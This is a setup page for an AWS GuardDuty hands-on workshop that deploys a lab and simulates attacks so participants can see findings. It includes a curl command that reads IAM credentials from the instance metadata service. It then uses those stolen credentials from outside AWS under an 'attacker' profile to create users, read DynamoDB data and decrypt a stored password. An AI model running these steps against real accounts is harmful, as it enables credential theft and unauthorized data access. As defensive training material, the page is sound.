# Environment Setup


> All of the links assume you are using the **ap-southeast-2 (Sydney)** region.
## Deploy the environment

*  Navigate to the [Event Engine dashboard](https://dashboard.eventengine.run)
*  Enter your **team hash** code. 
*  Login to the AWS Console
*  Click this link [here](https://console.aws.amazon.com/cloudformation/home?region=ap-southeast-1#/stacks/new?stackName=GuardDuty-Hands-On&templateURL=https://s3-us-west-2.amazonaws.com/sa-security-specialist-workshops-us-west-2/guardduty-hands-on/guardduty-cfn-template.yml) to setup the GuardDuty environment
*  Enter your email address to recieve the notifications
*  Click the **Deploy to AWS** button above.  This will automatically take you to the console to run the template.
*  Click **Next** on the **Specify Template**, **Specify Details**, and **Options** sections.
*  Finally, acknowledge that the template will create IAM roles under **Capabilities** and click **Create**.

This will bring you back to the CloudFormation console. You can refresh the page to see the stack starting to create. Before moving on, make sure the stack is in a **CREATE_COMPLETE**.

The initial findings will begin to show up in GuardDuty 10 minutes after the CloudFormation stack creation completes. 
###
**![#f03c15](https://placehold.it/15/f03c15/000000?text=+) Note: Please ensure you confirm the subscription you received in your inbox so you can receive notifications as the lab progresses**

### What is created?

The CloudFormation template will create the following resources:

  * Three [Amazon EC2](https://aws.amazon.com/ec2/) Instances (and supporting network infrastructure)
    * Two Instances that contain the name “*Compromised Instance*”
    * One instance that contains the name “*Malicious Instance*”
  * [AWS IAM Role](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html) For EC2 which will have permissions to SSM Parameter Store and DynamoDB
  * One [Amazon SNS Topic](https://docs.aws.amazon.com/sns/latest/dg/GettingStarted.html) so you will be able to receive notifications
  * Three [AWS CloudWatch Event](https://docs.aws.amazon.com/AmazonCloudWatch/latest/events/WhatIsCloudWatchEvents.html) rules for triggering the appropriate notification or remediation
  * Two [AWS Lambda](https://aws.amazon.com/lambda/) functions that will be used for remediating findings and will have permissions to modify Security Groups and revoke active IAM Role sessions (on only the IAM Role associated with this scenario)
  * [AWS Systems Manager Parameter Store](https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-paramstore.html) value for storing a fake database password.

> Make sure the CloudFormation stack is in a **CREATE_COMPLETE** status before moving on.

> **Make sure you confirm the subscription you recieved in your inbox**

### Generate a finding manually

All of the simulated attacks are automated in the CloudFormation template except for one; which requires you to take some manual steps.  To produce the final finding, you will need to copy the IAM temporary security credentials from the EC2 instance and make API calls from your laptop (the calls need to come from outside the AWS network). 

#### Retrieve the IAM temporary security credentials using AWS Systems Manager

To simulate this last and final attack you will need to retrieve the IAM temporary security credentials generated by the IAM Role for EC2. You can either SSH directly to the instance and query the metadata or follow the steps below to use [AWS Systems Manager Session Manager](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html) (an SSM agent was automatically started on the instance at launch). 

1.  Go to [Managed Instances](https://ap-southeast-1.console.aws.amazon.com/systems-manager/managed-instances?region=ap-southeast-1) within the **AWS Systems Manager** console (ap-southeast-1).
    
    > You should see an instance named **GuardDuty-Example: Compromised Instance: Scenario 3** with a ping status of **Online**.

2.  To see the keys currently active on the instance, click on **Session Manager** on the left navigation and then click **Start Session**.
3.  To see the credentials currently active on the instance, click on the radio button next to **Compromised Instance: Scenario 3** and click **Start Session**.
4.  Run the following command in the shell:

    ```
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/GuardDuty-Example-EC2-Compromised
    ```

5. Make note of the **AccessKeyID**, **SecretAccessKey**, and **Token**.

**Lets use the keys and run some queries**

The following commands will need to be run from outside the AWS environment for the trigger to take effect.
Please ensure that you have the AWSCLI installed, if not please follow the documentation below to install it
https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html

Once the AWSCLI is installed, replace <access_key>, <secret_key> and <session_token> with the values you captured from Session Manager and run the following commands

     
     aws configure set profile.attacker.region ap-southeast-1
     aws configure set profile.attacker.aws_access_key_id <access_key> 
     aws configure set profile.attacker.aws_secret_access_key <secret_key> 
     aws configure set profile.attacker.aws_session_token <session_token>
     

**Do you have any IAM permissions:**


```
aws iam list-users --profile attacker

aws iam create-user --user-name Chuck --profile attacker
```

**What about DynamoDB?**
```
aws dynamodb list-tables --profile attacker

aws dynamodb describe-table --table-name GuardDuty-Example-Customer-DB --profile attacker
```

**Can you query the data?**
```
aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile attacker

aws dynamodb put-item --table-name GuardDuty-Example-Customer-DB --item '{"name":{"S":"Joshua Tree"},"state":{"S":"Michigan"},"website":{"S":"https://www.nps.gov/yell/index.htm"}}' --profile attacker

aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile attacker

aws dynamodb list-tables --profile attacker
```

**Do you have access to Systems Manager Parameter Store?**
```
aws ssm describe-parameters --profile attacker

aws ssm get-parameters --names "gd_prod_dbpwd_sample" --profile attacker

aws ssm get-parameters --names "gd_prod_dbpwd_sample" --with-decryption --profile attacker

```

## Proceed to Scenario 1:

[Scenario 1](https://github.com/securityroadshow/amazon-guardduty-hands-on/blob/master/docs/scenario1/index.md)
